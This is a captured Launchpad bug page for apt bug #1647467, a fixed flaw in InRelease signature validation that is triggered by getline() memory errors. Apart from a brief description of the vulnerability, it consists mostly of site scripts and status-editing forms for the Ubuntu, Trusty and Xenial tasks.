<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1647467 “InRelease file splitter treats getline() errors as...” : Bugs : apt package : Ubuntu</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1647467" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1647467/bug.atom" title="Bug 1647467 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="We have just been made aware of a security bug upstream that affects the validation of signatures on InRelease file. This bug is to track progress for it.

It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.

It works by making a call to getline() fail with ENOMEM, which is not documented as an error for that but follows from the fact that getline() can allocate memory. In such a case, apt would treat the first part of the file as a valid ..." />
      <meta property="og:description" content="We have just been made aware of a security bug upstream that affects the validation of signatures on InRelease file. This bug is to track progress for it.

It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.

It works by making a call to getline() fail with ENOMEM, which is not documented as an error for that but follows from the fact that getline() can allocate memory. In such a case, apt would treat the first part of the file as a valid ..." />
    

    
    
      <meta property="og:title" content="Bug #1647467 “InRelease file splitter treats getline() errors as...” : Bugs : apt package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1647467" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/apt">apt package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/apt">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/apt">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/apt">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/apt">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/apt">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    InRelease file splitter treats getline() errors as EOF
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1647467 reported by
      <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a>
      <time title="2016-12-05 20:36:48 UTC" datetime="2016-12-05T20:36:48.710689+00:00">on 2016-12-05</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">272</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 3 people</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary2173793">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2173793">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/apt" title="Latest release: 2.3.11, uploaded to main on 2021-10-21 16:26:39.578178+00:00 by APT Development Team (deity), maintained by APT Development Team (deity)">apt (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2173793">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~juliank">Julian Andres Klode</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2173793">
     <td colspan="7"><form action="/ubuntu/+source/apt/+bug/1647467/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/+source/apt">apt (Ubuntu)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-12-05 20:36:48 UTC" datetime="2016-12-05T20:36:48.710689+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-12-05 20:37:01 UTC" datetime="2016-12-05T20:37:01.933783+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2016-12-05 22:19:38 UTC" datetime="2016-12-05T22:19:38.210106+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-12-05 22:19:38 UTC" datetime="2016-12-05T22:19:38.209326+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-12-18 01:53:53 UTC" datetime="2016-12-18T01:53:53.990671+00:00">2016-12-18</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ubuntu_apt.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ubuntu_apt.target.option.package" name="ubuntu_apt.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ubuntu_apt.target.distribution" name="ubuntu_apt.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ubuntu_apt.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ubuntu_apt.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="apt" id="ubuntu_apt.target.package"
                         name="ubuntu_apt.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_apt.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_apt.target.package');
              var select_menu = Y.DOM.byId('ubuntu_apt.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_apt-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_remove_button": false, "header": "Select a package", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "DistributionPackage", "extra_no_results_message": null, "selected_value": "apt", "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_apt-target-package", "step_title": "Search by name", "assign_me_text": "Pick me", "input_element": "ubuntu_apt.target.package"};
        var show_widget_id = 'show-widget-ubuntu_apt-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="ubuntu_apt.target.option.product" name="ubuntu_apt.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ubuntu_apt.target.product"
                         name="ubuntu_apt.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_apt.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_apt.target.product');
              var select_menu = Y.DOM.byId('ubuntu_apt.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_apt-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_remove_button": false, "header": "Select a project", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "Product", "extra_no_results_message": null, "selected_value": null, "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_apt-target-product", "step_title": "Search", "assign_me_text": "Pick me", "input_element": "ubuntu_apt.target.product"};
        var show_widget_id = 'show-widget-ubuntu_apt-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_apt.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_apt.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_apt.status" name="ubuntu_apt.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_apt.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceHIGH">High</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_apt.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_apt.assignee.assign_to_me" name="ubuntu_apt.assignee.option" value="ubuntu_apt.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_apt.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="ubuntu_apt.assignee.assigned_to" name="ubuntu_apt.assignee.option" value="ubuntu_apt.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="ubuntu_apt.assignee.assigned_to">
              Julian Andres Klode (juliank)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_apt.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_apt.comment_on_change" name="ubuntu_apt.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2173840">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/trusty/+source/apt/+bug/1647467/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/apt">Trusty</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/apt/+bug/1647467/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/trusty/+source/apt/+bug/1647467/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2173840">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2173840">
     <td colspan="7"><form action="/ubuntu/trusty/+source/apt/+bug/1647467/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/trusty/+source/apt">apt (Ubuntu Trusty)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-12-05 23:19:45 UTC" datetime="2016-12-05T23:19:45.713744+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-12-13 17:12:12 UTC" datetime="2016-12-13T17:12:12.606231+00:00">2016-12-13</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-12-13 17:12:12 UTC" datetime="2016-12-13T17:12:12.606231+00:00">2016-12-13</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-12-13 17:12:12 UTC" datetime="2016-12-13T17:12:12.606231+00:00">2016-12-13</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    <table>
      <tr>
        <td>
          <label for="ubuntu_trusty_apt.sourcepackagename">Package</label>
        </td>
      </tr>
      <tr>
        <td>
          


    <input type="text" value="apt" id="ubuntu_trusty_apt.sourcepackagename"
                         name="ubuntu_trusty_apt.sourcepackagename" size="20"
                         maxlength=""
                         onKeyPress="" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_trusty_apt.sourcepackagename');
              var select_menu = Y.DOM.byId('ubuntu_trusty_apt.sourcepackagename-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_trusty_apt-sourcepackagename" href="#">Find&hellip;</a>)</span>
    <script>
  LPJS.use('node', 'lp.app.picker', function(Y) {
      var config = {"show_remove_button": false, "header": "Select a package", "vocabulary_filters": [], "remove_team_text": "Remove team", "remove_person_text": "Remove person", "selected_value_metadata": null, "show_create_team": false, "picker_type": "default", "vocabulary_name": "DistributionSourcePackage", "extra_no_results_message": null, "selected_value": "apt", "show_assign_me_button": false, "show_widget_id": "show-widget-ubuntu_trusty_apt-sourcepackagename", "step_title": "Search by name", "assign_me_text": "Pick me", "input_element": "ubuntu_trusty_apt.sourcepackagename"};
      var distribution_name = '';
      var distribution_id = '';
      var distroseries_id = '';
      if (distribution_name !== '') {
          config.getContextPath = function() {
              return '/' + distribution_name;
          }
      } else if (distribution_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distribution_id).value;
          };
      } else if (distroseries_id !== '') {
          config.getContextPath = function() {
              return '/' + Y.DOM.byId(distroseries_id).value.split('/', 2)[0];
          };
      }
      var show_widget_id = 'show-widget-ubuntu_trusty_apt-sourcepackagename';
      Y.on('domready', function(e) {
          Y.lp.app.picker.addPicker(config, show_widget_id);
      });
  });
  </script>
  



          
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_trusty_apt.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_trusty_apt.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_trusty_apt.status" name="ubuntu_trusty_apt.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ubuntu_trusty_apt.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_trusty_apt.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_trusty_apt.assignee.assign_to_nobody" name="ubuntu_trusty_apt.assignee.option" value="ubuntu_trusty_apt.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_trusty_apt.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_trusty_apt.assignee.assign_to_me" name="ubuntu_trusty_apt.assignee.option" value="ubuntu_trusty_apt.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_trusty_apt.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_trusty_apt.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_trusty_apt.comment_on_change" name="ubuntu_trusty_apt.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2173844">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/xenial/+source/apt/+bug/1647467/+editstatus">
        &#8203;
      </a>
    </td>
    <td style="padding: 0.3em 0em 0.3em 1.5em">
      <span class="sprite milestone"></span>
      
        <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/apt">Xenial</a>
      
        
    </td>
    

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/apt/+bug/1647467/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ubuntu/xenial/+source/apt/+bug/1647467/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2173844">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2173844">
     <td colspan="7"><form action="/ubuntu/xenial/+source/apt/+bug/1647467/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/xenial/+source/apt">apt (Ubuntu Xenial)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2016-12-05 23:19:45 UTC" datetime="2016-12-05T23:19:45.713744+00:00">2016-12-05</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2016-12-13 17:02:05 UTC" datetime="2016-12-13T17:02:05.656681+00:00">2016-12-13</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2016-12-13 17:02:05 UTC" datetime="2016-12-13T17:02:05.656681+00:00">2016-12-13</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2016-12-13 17:02:05 UTC" datetime="2016-12-13T17:02:05.656681+00:00">2016-12-13</time>
      </td>
    </tr>
  </table>
  <div class="field">
    
    <table>
      <tr>
        <td>
          <label for="ubuntu_xenial_apt.sourcepackagename">Package</label>
        </td>
      </tr>
      <tr>
        <td>
          


    <input type="text" value="apt" id="ubuntu_xenial_apt.sourcepackagename"
                         name="ubuntu_xenial_apt.sourcepackagename" size="20"
                         maxlength=""
                         onKeyPress="" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_xenial_apt.sourcepackagename');
              var select_menu = Y.DOM.byId('ubuntu_xenial_apt.sourcepackagename-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_xenial_apt-sourcepackagename" href="#">Find&hellip;</a>)</span>
    <script>
  LPJS.use('node', 'lp.app.picker', function(Y) {
